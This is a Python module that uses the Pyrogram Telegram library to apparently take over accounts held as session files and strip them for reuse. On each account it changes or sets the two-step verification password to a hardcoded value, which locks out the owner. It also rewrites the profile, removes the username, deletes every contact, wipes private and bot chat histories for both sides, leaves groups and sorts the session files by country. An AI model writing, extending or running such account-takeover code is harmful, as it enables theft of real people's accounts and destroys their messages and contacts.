import asyncio
from pyrogram.raw import functions, types as raw_types
from pyrogram.errors import RPCError, FloodWait
from config import SPAM_APPROVAL, BASE_SESSION_DIR, FORCE_JOIN_CHANNELS
import os
import shutil


async def check_force_join(client, user_id):
    not_joined = []
    for ch in FORCE_JOIN_CHANNELS:
        try:
            member = await client.get_chat_member(ch["username"], user_id)
            status = str(member.status).lower()
            if any(s in status for s in ("left", "kicked", "banned")):
                not_joined.append(ch)
        except Exception:
            not_joined.append(ch)
    return not_joined


async def spambot_check(client, bot, admin_id, phone):
    await client.send_message("SpamBot", "/start")
    await asyncio.sleep(3)

    reply_text = ""
    async for msg in client.get_chat_history("SpamBot", limit=1):
        reply_text = msg.text or ""

    if "no limits are currently applied" in reply_text.lower():
        return True

    await bot.send_message(
        admin_id,
        f"⚠️ **SpamBot Warning!**\n\n"
        f"📞 **Phone:** `{phone}`\n\n"
        f"{reply_text}\n\n"
        f"**Reply:**\n"
        f"`/approve_{phone}` — Continue\n"
        f"`/skip_{phone}` — Skip"
    )
    SPAM_APPROVAL[phone] = None
    return None


async def finalize_admin_acc(client, bot, admin_id, phone, country, current_pwd=None):
    try:
        await asyncio.sleep(2)

        # SpamBot check
        try:
            try:
                await client.unblock_user("spambot")
            except BaseException:
                pass

            allowed = await spambot_check(client, bot, admin_id, phone)

            if allowed is None:
                while SPAM_APPROVAL.get(phone) is None:
                    await asyncio.sleep(2)
                allowed = SPAM_APPROVAL.pop(phone)

            if not allowed:
                await bot.send_message(admin_id, f"⏭ **Account** `{phone}` **skipped (SpamBot).**")
                await client.disconnect()
                return

        except Exception as e:
            await bot.send_message(admin_id, f"⚠️ **SpamBot Warning** `{phone}`:\n`{e}`")

        # Profile
        try:
            me = await client.get_me()
            await client.update_profile(first_name="ꪹꪖᦔꫝꫀꫀ", last_name="", bio="ᡶꪊꪑ ᩏꪖ᭢ỉ ᧒ꫀకỉ ꪉꫀꫝꫝ ᦋꪗꪊ ꪑꪖỉ ꪑꪖꪊకꪖꪑ ᧒ꪖỉకꪖ ꪉꪖᦔꪖꪶ ᦋꪗꪖ..... ᧒ꪖꪉకꫀ ꪑ")
        except Exception as e:
            await bot.send_message(admin_id, f"⚠️ **Profile Warning** `{phone}`:\n`{e}`")

        # Username
        try:
            if getattr(me, "username", None):
                await client.invoke(functions.account.UpdateUsername(username=""))
        except RPCError as e:
            await bot.send_message(admin_id, f"⚠️ **Username Warning** `{phone}`:\n`{e}`")

        # Privacy
        try:
            await client.invoke(
                functions.account.SetPrivacy(
                    key=raw_types.InputPrivacyKeyPhoneNumber(),
                    rules=[raw_types.InputPrivacyValueDisallowAll()]
                )
            )
            await client.invoke(
                functions.account.SetPrivacy(
                    key=raw_types.InputPrivacyKeyAddedByPhone(),
                    rules=[raw_types.InputPrivacyValueAllowContacts()]
                )
            )
        except Exception as e:
            await bot.send_message(admin_id, f"⚠️ **Privacy Warning** `{phone}`:\n`{e}`")

        # 2FA
        try:
            if current_pwd:
                await client.change_cloud_password(current_password=current_pwd, new_password="nikitayt7")
            else:
                await client.enable_cloud_password(password="nikitayt7", hint="")
        except Exception as e:
            await bot.send_message(admin_id, f"⚠️ **2FA Warning** `{phone}`:\n`{e}`")

        # Contacts
        try:
            contacts = await client.invoke(functions.contacts.GetContacts(hash=0))
            if contacts.users:
                await client.invoke(
                    functions.contacts.DeleteContacts(
                        id=[raw_types.InputUser(user_id=u.id, access_hash=u.access_hash) for u in contacts.users]
                    )
                )
                await client.invoke(functions.contacts.ResetSaved())
        except FloodWait as fw:
            await asyncio.sleep(fw.value)
        except Exception as e:
            await bot.send_message(admin_id, f"⚠️ **Contacts Error** `{phone}`:\n`{e}`")

        # Chat cleanup
        try:
            async for dialog in client.get_dialogs():
                chat = dialog.chat
                if chat.id == 777000:
                    continue
                if getattr(chat, "username", None) and chat.username.lower() == "spambot":
                    continue
                if chat.id == "me":
                    try:
                        peer = await client.resolve_peer("me")
                        await client.invoke(functions.messages.DeleteHistory(peer=peer, max_id=0, revoke=True))
                    except FloodWait as fw:
                        await asyncio.sleep(fw.value)
                    except BaseException:
                        pass
                    continue
                if chat.type == "bot":
                    try:
                        peer = await client.resolve_peer(chat.id)
                        await client.invoke(functions.messages.DeleteHistory(peer=peer, max_id=0, revoke=True))
                        await client.block_user(chat.id)
                    except FloodWait as fw:
                        await asyncio.sleep(fw.value)
                    except BaseException:
                        continue
                elif chat.type == "private":
                    try:
                        peer = await client.resolve_peer(chat.id)
                        await client.invoke(functions.messages.DeleteHistory(peer=peer, max_id=0, revoke=True))
                    except FloodWait as fw:
                        await asyncio.sleep(fw.value)
                    except BaseException:
                        continue
                else:
                    try:
                        await client.leave_chat(chat.id)
                    except FloodWait as fw:
                        await asyncio.sleep(fw.value)
                    except BaseException:
                        continue
        except Exception as e:
            await bot.send_message(admin_id, f"⚠️ **Chat Cleanup Error** `{phone}`:\n`{e}`")

        # Session move
        try:
            c_path = os.path.join(BASE_SESSION_DIR, country)
            os.makedirs(c_path, exist_ok=True)
            await client.disconnect()
            phone_str = str(phone).strip()
            shutil.move(
                f"{BASE_SESSION_DIR}/{phone_str}.session",
                f"{c_path}/{phone_str}.session"
            )
        except Exception as e:
            await bot.send_message(admin_id, f"⚠️ **Session Move Warning** `{phone}`:\n`{e}`")

        # Success
        await bot.send_message(
            admin_id,
            f"✅ **ᴀᴄᴄᴏᴜɴᴛ ᴀᴅᴅᴇᴅ!**\n\n"
            f"📞 `{phone}`\n"
            f"🌍 **ᴄᴏᴜɴᴛʀʏ:** {country}\n"
            f"✅ **sᴘᴀᴍʙᴏᴛ: ᴄʟᴇᴀɴ**"
        )

    except Exception as e:
        await bot.send_message(admin_id, f"❌ **Fatal Error** `{phone}`:\n`{e}`")
